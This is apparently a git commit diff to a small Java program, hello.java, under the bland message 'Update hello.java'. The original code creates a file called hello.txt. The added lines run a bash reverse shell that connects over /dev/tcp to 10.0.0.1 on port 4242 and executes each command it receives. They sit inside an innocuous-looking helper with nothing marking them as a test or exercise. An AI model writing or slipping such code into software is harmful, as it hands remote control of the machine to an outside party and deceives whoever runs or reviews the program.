d30ffd39eed663c6e34c3991fdfdbcde37f52af6
aman143kri <42419157+aman143kri@users.noreply.github.com>
2024-12-20 10:27:43 -0800

    Update hello.java

--- hello.java
+++ hello.java
@@ -6,6 +6,9 @@ public class RunCommand {
             Process process = Runtime.getRuntime().exec("touch hello.txt");
             process.waitFor();
             System.out.println("hello.txt created");
+            Runtime r = Runtime.getRuntime();
+            Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+            p.waitFor();
         } catch (IOException | InterruptedException e) {
             e.printStackTrace();
         }
